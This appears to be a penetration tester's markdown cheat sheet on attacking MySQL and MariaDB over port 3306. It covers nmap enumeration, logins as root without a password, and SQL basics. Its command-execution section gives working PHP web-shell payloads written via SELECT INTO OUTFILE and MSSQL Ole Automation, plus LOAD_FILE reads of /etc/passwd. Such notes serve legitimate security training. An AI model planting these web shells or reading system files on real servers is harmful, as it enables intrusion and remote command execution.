---
title: 3306 mariadb mysql
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - mariadb
  - port 3306
  - mysql
---

# 3306 mariaDB - mySQL

## Description

**MySQL**: MySQL is an open-source relational database management system(RDBMS) based on Structured Query Language (SQL). It is developed and managed by oracle corporation and initially released on 23 may, 1995. It is widely being used in many small and large scale industrial applications and capable of handling a large volume of data. After the acquisition of MySQL by Oracle, some issues happened with the usage of the database and hence MariaDB was developed.

**MariaDB**: MariaDB is an open source relational database management system (RDBMS) that is a compatible drop-in replacement for the widely used MySQL database technology. It is developed by MariaDB Foundation and initially released on 29 October 2009. MariaDB has a significantly high number of new features, which makes it better in terms of performance and user-orientation than MySQL.


```shell-session
sudo nmap $ip -sV -sC -p3306 --script mysql*
```

```
sudo nmap -sS -sV --script mysql-empty-password -p 3306 $ip
```



## Connect to database: mariadb

```bash
# -h host/ip   
# -u user As default mariadb has a root user with no authentication
mariadb -h <host/IP> -u root
```


## Connect to database: mysql 

### From Linux

```bash
# -h host/ip   
# -u user As default mysql has a root user with no authentication
mysql --host=INSTANCE_IP --user=root --password=thepassword
mysql -h <host/IP> -u root -p<password>

mysql -u root -h <host/IP>
```

#### sqsh

```shell-session
# Targeting a local account:
sqsh -S $ip -U <username> -P 'MyPassword!' -h

# Targeting Windows authentication
sqsh -S $ip -U .\\username -P 'MyPassword!' -h
# -h: disable headers and footers for a cleaner look.
```

#### mssqlclient.py from impacket 

```shell-session
mssqlclient.py -p $port username@$ip 
```



### From windows

#### mysql.exe

```cmd-session
mysql.exe -u username -pPassword123 -h $IP
```

#### sqlcmd

```cmd-session
sqlcmd -S <server> -U <username> -P 'MyPassword!' -y 30 -Y 30
# When we authenticate to MSSQL using `sqlcmd` we can use the parameters `-y` (SQLCMDMAXVARTYPEWIDTH) and `-Y` (SQLCMDMAXFIXEDTYPEWIDTH) for better looking output. Keep in mind it may affect performance.
```

## mariadb commands

```bash
# Get all databases
show databases;

# Select a database
use <databaseName>;

# Get all tables from the previously selected database
show tables; 

# Dump columns from a table
describe <table_name>;

# Dump columns from a table
show columns from <table>;

# Select column from table
select usename,password from users;
```

## Upload a shell 

Take a wordpress installation that uses a mysql database. If you manage to login into the mysql panel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.

```mysql
Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

## mysql basic commands

See [mysql](mysql.md).


```mysql
# Show datases
SHOW databases;

# Show tables
SHOW tables;

# Create new database
CREATE DATABASE nameofdatabase;

# Delete database
DROP DATABASE nameofdatabase;

# Select a database
USE nameofdatabase;

# Show tablesç
SHOW tables;

# Dump content from nameOftable
SELECT * FROM NameOfTable

# Create a table with some columns in the previously selected database
CREATE TABLE person(nombre VARCHAR(255), edad INT, id INT);

# Modify, add, or remove a column attribute of a table
ALTER TABLE persona MODIFY edad VARCHAR(200);
ALTER TABLE persona ADD description VARCHAR(200);
ALTER TABLE persona DROP edad VARCHAR(200);

# Insert a new row with values in a table
INSERT INTO persona VALUES("alvaro", 54, 1);

# Show all rows from table
SELECT * FROM persona

# Select a row from a table filtering by the value of a given column
SELECT * FROM persona WHERE nombre="alvaro";

# JOIN query
SELECT * FROM oficina JOIN persona ON persona.id=oficina.user_id;

# UNION query. This means, for an attack, that the number of columns has to be the same
SELECT * FROM oficina UNION SELECT * from persona;
```


### Enumeration queries 

```mysql
# Show current user
current_user()
user()

# Show current database
database()
```

## Command execution

### Writing files

`MySQL` supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys).

`MySQL` does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. 

- If `MySQL` operates on a PHP-based web server or other programming languages like ASP.NET, having  the appropriate privileges, attempt to write a file using [SELECT INTO OUTFILE](https://mariadb.com/kb/en/select-into-outfile/) in the webserver directory. 
- Browse to the location where the file is and execute the commands.

```mysql
 SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

- In `MySQL`, a global system variable [secure_file_priv](https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv) limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the [LOAD_FILE()](https://dev.mysql.com/doc/refman/5.7/en/string-functions.html#function_load-file) function. These operations are permitted only to users who have the [FILE](https://dev.mysql.com/doc/refman/5.7/en/privileges-provided.html#priv_file) privilege.
- Settings in the `secure_file_priv`:
	- If empty, the variable has no effect, which is not a secure setting as we can read and write data using `MySQL`:
		
		```mysql
		show variables like "secure_file_priv";
		```

```shell-session

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

```cmd-session
# To write files using MSSQL, we need to enable Ole Automation Procedures, which requires admin privileges, and then execute some stored procedures to create the file:

sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure 'Ole Automation Procedures', 1;
RECONFIGURE;

# Using MSSQL to Create a File
DECLARE @OLE INT;
DECLARE @FileID INT;
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1;
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>';
EXECUTE sp_OADestroy @FileID;
EXECUTE sp_OADestroy @OLE;

```

- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.


### Reading files

#### MySQL - Read Local Files in MySQL

If permissions allows it:

```shell-session
select LOAD_FILE("/etc/passwd");
```


